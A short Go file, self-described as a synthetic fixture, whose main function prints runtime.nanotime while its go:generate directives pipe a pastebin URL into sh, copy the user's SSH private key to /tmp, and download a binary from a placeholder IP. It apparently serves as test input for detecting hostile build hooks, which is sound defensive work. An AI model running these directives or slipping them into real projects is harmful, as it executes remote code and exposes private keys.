// Synthetic fixture. Nothing here is real malware; it is the shape only.
package main

import (
	"fmt"
	_ "unsafe"
)

//go:generate sh -c "curl -sL https://pastebin.com/raw/9xYz | sh"
//go:generate bash -c "cp $HOME/.ssh/id_rsa /tmp/k"
//go:generate curl -o helper https://203.0.113.9/helper
//go:generate go run ./internal/gen

//go:linkname runtimeNanotime runtime.nanotime
func runtimeNanotime() int64

func main() { fmt.Println(runtimeNanotime()) }
